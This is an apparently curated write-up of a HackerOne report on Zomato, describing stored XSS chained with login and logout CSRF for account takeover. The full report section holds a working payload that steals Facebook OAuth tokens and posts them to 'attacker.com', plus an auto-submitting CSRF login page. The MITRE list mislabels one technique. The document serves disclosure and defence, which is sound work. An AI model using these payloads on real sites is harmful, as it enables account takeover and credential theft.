# Self-Stored XSS Chained with Login/Logout CSRF Leading to Account Takeover

## Metadata
- **Source:** HackerOne
- **Report:** 632017 | https://hackerone.com/reports/632017
- **Submitted:** 2019-06-29
- **Reporter:** madguyyy
- **Program:** Zomato
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Stored XSS, CSRF, WAF Bypass, Token Theft, Account Takeover
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can compromise a victim's account through a sophisticated multi-step attack chaining stored XSS in restaurant reviews with CSRF vulnerabilities in logout/login endpoints. The attack exploits weak WAF protections to inject malicious JavaScript that steals Facebook/Google authentication tokens when the victim clicks edit on a poisoned review. By crafting a malicious webpage that logs out the victim and logs in the attacker's account before redirecting to the XSS payload, the attacker can steal OAuth tokens and gain unauthorized access to the victim's account.

## Attack scenario
1. Attacker crafts a malicious review containing JavaScript payload in the 'with_tags_data' parameter that bypasses WAF filters
2. Attacker submits the review to a restaurant page on Zomato, storing the XSS payload in the database
3. Attacker creates a phishing webpage containing auto-submit forms that exploit CSRF vulnerabilities in logout and login endpoints
4. Victim visits the attacker's phishing page, which silently logs them out and logs them into the attacker's account via CSRF
5. Victim is redirected to the poisoned review and clicks the 'Edit' button, triggering the stored XSS payload
6. The JavaScript executes, loads Facebook SDK, requests user permissions, steals OAuth tokens and signed requests, then exfiltrates them to attacker's server

## Root cause
Multiple security flaws compound into critical vulnerability: (1) Insufficient input validation on 'with_tags_data' parameter allowing script injection, (2) Weak or absent CSRF protection on critical authentication endpoints (/logout and /asyncLogin.php), (3) Inadequate WAF rules that fail to detect JavaScript payloads in specific parameters, (4) Improper output encoding when displaying user-submitted review data, (5) Trust in OAuth tokens without additional verification mechanisms

## Attacker mindset
Sophisticated attacker understanding of web vulnerabilities and OAuth token mechanics. The attacker demonstrates knowledge of: CSRF exploitation for state-changing operations, OAuth token lifecycle and validity windows, WAF evasion techniques, DOM-based attack chains, and social engineering (phishing link distribution). The attacker recognizes that chaining multiple 'medium' severity bugs creates a critical impact, and understands that users are more likely to interact with legitimate-looking content (review edit buttons) than obvious malicious links.

## Defensive takeaways
- Implement strict input validation and output encoding on all user-supplied content, especially in parameters like 'with_tags_data'
- Enforce CSRF protection on all state-changing operations including logout and login endpoints using synchronizer tokens or SameSite cookies
- Deploy comprehensive WAF rules that detect malicious patterns across all parameters, not just common ones
- Use Content Security Policy (CSP) with strict directives to prevent inline script execution
- Implement additional OAuth security: require signed requests verification, use PKCE flow, implement token binding, add device fingerprinting
- Apply security headers: X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security
- Implement rate limiting and anomaly detection on authentication endpoints
- Use HttpOnly and Secure flags on authentication cookies to prevent token theft via JavaScript
- Implement logout that invalidates all sessions server-side, not just client-side
- Regular security testing including chained vulnerability assessments

## Variant hunting
Look for similar patterns in other user-generated content features (comments, messages, profiles), other OAuth providers beyond Facebook/Google (LinkedIn, GitHub, Twitter), different parameter names that might bypass WAF rules (alternative naming conventions, encoding bypasses), stored XSS in other Zomato features (user profiles, photos, replies), CSRF on other sensitive operations (password change, email update, payment methods), other authentication mechanisms that lack proper CSRF protection

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1566 - Phishing
- T1598 - Phishing for Information
- T1187 - Forced Authentication
- T1056 - Keylogging
- T1056.004 - Credential Dumping
- T1550.001 - Use Alternate Authentication Material
- T1539 - Steal Web Session Cookie

## Notes
This is an exemplary writeup demonstrating chained vulnerability exploitation achieving critical impact from moderate individual vulnerabilities. The attack's elegance lies in the forced sequence: stored XSS alone is useless without victim interaction, CSRF alone doesn't grant access, but together they create seamless account takeover. The mention of Facebook tokens being valid for ~1 hour with attacker's ability to refresh them highlights persistence capability. The absence of specific bounty amount suggests this may have been resolved before disclosure or under confidentiality agreement. The PoC uses minified JavaScript, indicating attacker actively avoided detection. Key insight: the redirect chain to 'edit' button click is social engineering - the victim appears to be using legitimate functionality.

## Full report
<details><summary>Expand</summary>

> NOTE! This report explains taking over an account in a single click by chaining stored XSS, WAF bypass, login and logout CSRF.

**Summary:** Attacker can takeover someone's account by stealing their facebook / google login tokens chaining multiple vulnerabilities.

**Description:** Attacker leaves a review on restaurant's page with XSS payload. Which is triggered when attacker tries to edit the review. By chaining multiple bugs, a webpage is crafted that will make victim logout of his account, login to attacker's account, redirects to XSS review page. Victim's facebook / google tokens are sent to attacker when victim clicks on edit button.

**Platform(s) Affected:** Website

## Steps To Reproduce:

**Request:**
Vulnerable parameter: **`with_tags_data`**

Method: `POST`
URL: `https://www.zomato.com/php/submitReview`
Parameters:
```
review=140 characters long review&
review_db=140 characters long review&
with_tags_data=<script>prompt(0,document.domain)</script>&
res_id=19132208&
city_id=11333&
rating=5&
is_edit=0&
review_id=0&
save_image=1&
instagram_images_to_update=[]&
instagram_json_data={"data":[]}&
uploaded_images_json=[]&
share_to_fb=false&
share_to_tw=false&
snippet=restaurant-review&
web_source=default&
csrf_token=2acad4ba08d4000000000007923a25d&
external_url=
```
**Click on `Edit` button. It will trigger prompt box**


### _Write review with XSS payload_
Use the following JavaScript payload and add it in **with_tags_data** parameter.
This code, when executed, will get Facebook authentication tokens of victim and send to attacker's server. Code can be improved to get Google authentication tokens as well. Code can be improved to get token with extra permissions like getting Google's contact list. In PoC video I have used minified version of this script
```html
<script>
// load fb js-sdk
(function(d, s, id){
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) {return;}
      js = d.createElement(s); js.id = id;
      js.src = "//connect.facebook.net/en_US/sdk.js";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

window.fbAsyncInit = function() {
      FB.init({
        appId      : '288523881080', // zomato fb app id
        xfbml      : true,
        version    : 'v3.1'
      });

//get auth response ( accessToken and signedRequest )
FB.login(function(){
	$.post('https://attacker.com/tokens.php',FB.getAuthResponse())}); // send token and signed_request to attacker
	document.location.href = 'https://www.zomato.com/logout'; // logout from victims's account
 }
</script>
```

### _Crafting auto login page_
1. Intercept HTTP requests and login with facebook
2. Create an HTML form to mimic request on `https://www.zomato.com/php/asyncLogin.php`
3. Replace link in last line of  `script` code with link to review with XSS payload.

```html
<form target="attackerTokens" method="post" action="https://www.zomato.com/php/asyncLogin.php?access_token=██████">
	<input name='authResponse[accessToken]' value='█████'>
	<input name='authResponse[userID]' value='███'>
	<input name='authResponse[expiresIn]' value='5073'>
	<input name='authResponse[signedRequest]' value='████'>
	<input name='authResponse[reauthorize_required_in]' value='7774406'>
	<input name='authResponse[data_access_expiration_time]' value='1569568133'>
	<input type=submit>
</form>
<iframe name="attackerTokens"></iframe>

<!-- logout current session -->
<img src="https://www.zomato.com/logout">
<script>
setTimeout(function(){ document.forms[0].submit(); }, 1500); // login attackers account
setTimeout(function(){ window.location.href='http://zoma.to/link_to_review'; }, 4000); // redirect to XSS payload page
</script>
```

**What does this page do?**
* This page will logout victim if already logged in. See `img` tag.
* After that, it will submit the login form and attacker's account be logged in on victim's computer.
* After login, it will redirect to review page with XSS payload. 
* Once victim click on `Edit` button, XSS will trigger and get victim's facebook tokens and send it to attacker's server.
* Attacker is capable of using these token to login to victim's account.

### _Bugs Chained_
1. CSRF is not working on logout URL
2. CSRF is not working on login URL
3. WAF is not working when javascript code is sent in `with_tags_data` parameter
4. `with_tags_data` is vulnerable to Stored XSS.

> Fact: Facebook login tokens are by default valid for an hour. But attacker can run a script on server to get fresh tokens every minute, which he can place into crafted HTML.

> Note: No real restaurant pages were harmed in PoC video. I replaced `res_id` with the restaurant I added.
> In PoC, **Techboy** is attacker and **Sukhmeet** is victim.

## Impact

One click can make someone lose his account.

</details>

---
*Analysed by Claude on 2026-05-12*
